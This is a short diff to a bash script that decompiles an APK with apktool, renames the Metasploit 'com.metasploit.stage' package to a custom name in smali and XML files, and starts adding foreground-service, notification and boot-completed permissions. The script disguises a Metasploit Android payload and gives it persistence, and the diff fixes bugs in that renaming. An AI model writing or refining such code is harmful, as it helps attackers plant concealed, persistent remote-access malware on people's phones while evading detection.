@@ -91,9 +91,11 @@ echo "[1] Decompiling APK with apktool..."
 apktool d -f "$APK" -o "$WORK" 2>/dev/null || { echo "apktool not found - skipping"; exit 0; }
 
 echo "[2] Replacing package name..."
-find "$WORK" -type f -name "*.smali" -exec sed -i "s/com\\/metasploit\\/stage/${pkg//./\\/}/g" {} \\;
-find "$WORK" -type f -name "*.xml" -exec sed -i "s/com\\.metasploit\\.stage/${pkg}/g" {} \\;
-sed -i "s/com\\.metasploit\\.stage/${pkg}/g" "$WORK/AndroidManifest.xml" 2>/dev/null || true
+PKG_SMALI=$(echo "$PKG" | tr '.' '/')
+PKG_DOTS=$(echo "$PKG" | sed 's/\./\\./g')
+find "$WORK" -type f -name "*.smali" -exec sed -i "s/com\\/metasploit\\/stage/$PKG_SMALI/g" {} \\;
+find "$WORK" -type f -name "*.xml" -exec sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" {} \\;
+sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" "$WORK/AndroidManifest.xml" 2>/dev/null || true
 
 echo "[3] Injecting foreground service manifest entries..."
 # Add FOREGROUND_SERVICE, POST_NOTIFICATIONS, BOOT_COMPLETED
